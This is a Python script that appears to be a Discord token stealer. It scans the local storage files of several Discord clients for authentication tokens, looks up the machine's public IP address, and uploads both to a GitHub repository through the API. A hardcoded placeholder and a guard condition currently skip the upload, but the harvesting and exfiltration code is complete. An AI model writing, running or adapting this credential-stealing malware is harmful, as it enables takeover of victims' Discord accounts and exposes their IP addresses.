import os
import re
import json
import requests
from datetime import datetime

def fdt():
    t = []
    p = [os.path.join(os.getenv('LOCALAPPDATA'), 'Discord', 'Local Storage', 'leveldb'), os.path.join(os.getenv('APPDATA'), 'Discord', 'Local Storage', 'leveldb'), os.path.join(os.getenv('LOCALAPPDATA'), 'DiscordCanary', 'Local Storage', 'leveldb'), os.path.join(os.getenv('APPDATA'), 'DiscordCanary', 'Local Storage', 'leveldb'), os.path.join(os.getenv('LOCALAPPDATA'), 'DiscordPTB', 'Local Storage', 'leveldb'), os.path.join(os.getenv('APPDATA'), 'DiscordPTB', 'Local Storage', 'leveldb')]
    for pa in p:
        if not os.path.exists(pa):
            continue
        for fn in os.listdir(pa):
            if not fn.endswith('.log') and not fn.endswith('.ldb'):
                continue
            for li in [x.strip() for x in open(os.path.join(pa, fn), errors='ignore').readlines() if x.strip()]:
                for rx in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for tk in re.findall(rx, li):
                        t.append(tk)
    return list(set(t))

def gia():
    try:
        r = requests.get('https://api.ipify.org?format=json')
        r.raise_for_status()
        return r.json()['ip']
    except requests.exceptions.RequestException:
        return None

def stupr(tkns, ip, ghtk, rpo):
    gua = f'https://api.github.com/repos/{rpo}/contents'
    h = {'Authorization': f'token {ghtk}', 'Accept': 'application/vnd.github.v3+json'}
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    tf = f'tokens_{ts}.txt'
    ifn = f'ip_address_{ts}.txt'
    cm = f'Add log - {ts}'
    try:
        td = {'message': cm, 'content': '\n'.join(tkns).encode('utf-8').decode('utf-8')}
        tu = f'{gua}/{tf}'
        rt = requests.put(tu, headers=h, data=json.dumps(td))
        rt.raise_for_status()
        print(f"Tokens uploaded: {rt.json()['content']['html_url']}")
        idat = {'message': cm, 'content': (ip if ip else 'N/A').encode('utf-8').decode('utf-8')}
        iu = f'{gua}/{ifn}'
        ri = requests.put(iu, headers=h, data=json.dumps(idat))
        ri.raise_for_status()
        print(f"IP uploaded: {ri.json()['content']['html_url']}")
    except requests.exceptions.RequestException as e:
        print(f"Upload error: {e}")
        if e.response is not None:
            print(f"Github API Error: {e.response.status_code} - {e.response.json()}")

if __name__ == "__main__":
    tokens = fdt()
    ip_address = gia()
    ght = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBXDPKRDq6FCll0dYdJw9hzbesUt5hekJBWiMKhsFcJm"
    repo = "Syxfer/mal_dis_ip_tsmalann_syxfer"
    if ght == "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBXDPKRDq6FCll0dYdJw9hzbesUt5hekJBWiMKhsFcJm":
        print(" \n")
    elif tokens or ip_address:
        stupr(tokens, ip_address, ght, repo)
